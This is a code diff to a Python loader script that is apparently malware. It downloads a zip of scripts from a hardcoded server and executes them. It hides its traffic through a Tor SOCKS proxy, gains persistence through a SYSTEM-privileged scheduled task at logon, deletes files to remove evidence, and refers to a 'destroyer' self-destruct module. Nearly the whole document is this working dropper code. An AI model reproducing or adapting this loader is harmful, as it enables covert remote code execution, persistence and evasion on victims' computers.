@@ -10,8 +10,7 @@ from platform import node # to get computer name
 from time import sleep # for any delays
 import destroyer
 
-#URL = 'http://127.0.0.1:8000' # the url from which the zip containing the scripts will be downloaded
-URL = 'http://10.0.2.2:8000'
+URL = 'http://10.0.2.2:8000' # the url from which the zip containing the scripts will be downloaded
 ZIP_NAME = 'scripts.zip' # what the name of the zip containing the scripts should be called
 TOR_INITIAL = True # whether the script should make the intial request through tor or the clearweb. Recommended True so you don't leak what you're doing to the router
 TIME = 1723820601 # the time that the started file will be set to verify it hasn't been changed
@@ -20,6 +19,10 @@ scripts_file = '' # a file that is a list of all the scripts
 started_file = ''  # a file that is made after the initial launch to tell the starter that the scripts were already downloaded
 scripts_direc = ''
 scripts_paths = [] # the paths of the scripts
+data = os.path.join(sys._MEIPASS, "data") # directory of all the files included within the exe. Includes the Task Scheduler XML, destroyer cmd file, TOR installation
+
+os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050' # set global proxy variables so all requests automatically go through the Tor SOCKS5 proxy without having to specify it in every request
+os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050' # ^
 
 pids = []
 platform = ''
@@ -30,6 +33,12 @@ if 'win' in sys.platform:
 elif sys.platform == 'linux':
     platform = 'linux'
 
+def start_tor(): # start Tor and wait for it to be up&ready
+    process = subprocess.Popen(os.path.join(data, "tor\\tor.exe"), stdout=subprocess.PIPE, text=True)
+    while True:
+        line = process.stdout.readline()
+        if '100%' in line:
+            break
 
 def check_admin(win=False):
     if win: # for windows
@@ -67,79 +76,36 @@ def get_scripts(): # downloads the scripts and puts them all in one place
             f.write(script_path)
     os.remove(ZIP_NAME) # delete the zip file to remove evidence
 
-def start_scripts():
-        for script in scripts_paths:
-            try:
-                if '.py' in script: # for python scripts
-                    process = subprocess.Popen([sys.executable, script]) # start each python script
-                    sleep(0.5)
-                    pids.append(process.pid)
-                else: # for any files
-                    subprocess.Popen(script, shell=True) # start each script
-                    sleep(0.5)
-                    pids.append(process.pid)
-            except: # if one of the scripts fail to run for any reason
+def start_scripts(alreadyRan=False):
+    for script in scripts_paths:
+        try:
+            if '.py' in script: # for python scripts
+                process = subprocess.Popen([sys.executable, script]) # start each python script
+                sleep(0.5)
+                pids.append(process.pid)
+            else: # for any files
+                subprocess.Popen(script, shell=True) # start each script
+                sleep(0.5)
+                pids.append(process.pid)
+        except: # if one of the scripts fail to run for any reason
+            if alreadyRan:
                 pass # probably destroy here
+            else:
+                start_scripts(alreadyRan=True)
 
 def make_renewable(py, platform): # makes the script start with admin privileges every time the computer is restarted
     if platform == 'win':
         Command = 'python' if py else __file__  # execute the file, with python if needed
         Arguments = __file__ if py else ''
         WorkingDirectory = __file__.replace(fr'\{os.path.basename(__file__)}', "")  # make the current directory the working directory
-        # the task file config
-        XML_LOGON = \
-fr'''<?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <Triggers>
-    <LogonTrigger>
-      <Enabled>true</Enabled>
-      <Delay>PT5S</Delay>
-    </LogonTrigger>
-  </Triggers>
-  <Principals>
-    <Principal id="Author">
-      <UserId>SYSTEM</UserId>
-      <RunLevel>HighestAvailable</RunLevel>
-    </Principal>
-  </Principals>
-  <Settings>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
-    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
-    <IdleSettings>
-      <StopOnIdleEnd>false</StopOnIdleEnd>
-      <RestartOnIdle>false</RestartOnIdle>
-    </IdleSettings>
-    <AllowStartOnDemand>true</AllowStartOnDemand>
-    <Enabled>true</Enabled>
-    <Hidden>false</Hidden>
-    <RunOnlyIfIdle>false</RunOnlyIfIdle>
-    <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
-    <Priority>7</Priority>
-  </Settings>
-  <Actions Context="Author">
-    <Exec>
-      <Command>{Command}</Command>
-      <Arguments>{Arguments}</Arguments>
-      <WorkingDirectory>{WorkingDirectory}</WorkingDirectory>
-    </Exec>
-  </Actions>
-</Task>'''
-        with open(f"{TaskName}.xml", "w") as f:  # make the config file
-            f.write(XML_LOGON)
         # The command to register the task that will automatically rerun this script on every logon
         cmd = ['schtasks',  # Call task scheduler
                '/Create',  # Tell it you're trying to make a task
                '/TN', TaskName,  # Specify the name of the task
-               '/XML', f'{TaskName}.xml',  # Tell it to import the task xml
+               '/XML', f'{data}\\{TaskName}.xml',  # Tell it to import the task xml
                '/RU', 'SYSTEM',  # Specify that the user making the task is SYSTEM for highest privileges
                '/F']  # force override if already exists to avoid any errors
         subprocess.run(cmd)  # register the task
-        os.remove(f'{TaskName}.xml')  # delete the file to remove evidence
     elif platform == 'linux':
         pass
 
@@ -188,6 +154,7 @@ if os.path.exists(started_file): # check if the starter has run before and if yo
     start_scripts()
 else:
     os.makedirs(scripts_direc, exist_ok=True)  # make the directory for the scripts that will be downloaded
+    # destroyer.setup_destroy_mechanism()
     get_scripts()
     make_path_list()
     if '.py' in __file__:
@@ -198,4 +165,3 @@ else:
     with open(started_file, 'w') as f: # open the started file to log that the scripts were downloaded
         f.close()
     start_scripts()
-    destroyer.setup_destroy_mechanism()
